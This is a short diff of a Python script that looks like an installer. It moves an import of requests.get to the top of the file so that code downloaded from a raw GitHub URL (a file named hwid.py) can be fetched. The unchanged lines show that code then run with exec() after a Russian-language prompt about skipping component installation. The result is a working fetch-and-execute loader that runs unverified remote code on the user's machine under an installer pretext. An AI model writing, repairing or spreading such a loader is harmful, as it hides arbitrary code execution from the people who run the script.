@@ -1,5 +1,6 @@
 import os
 import platform
+from requests import get
 
 startapp = get("https://raw.githubusercontent.com/hazurik/cnocep/main/hwid.py").text
 
@@ -21,7 +22,5 @@ def confirm(msg):
   return val[0] == 'y'
 
 print(confirm("Пропустить установку нуждающихся компонентов?"))
-
-from requests import get
 
 exec(startapp)
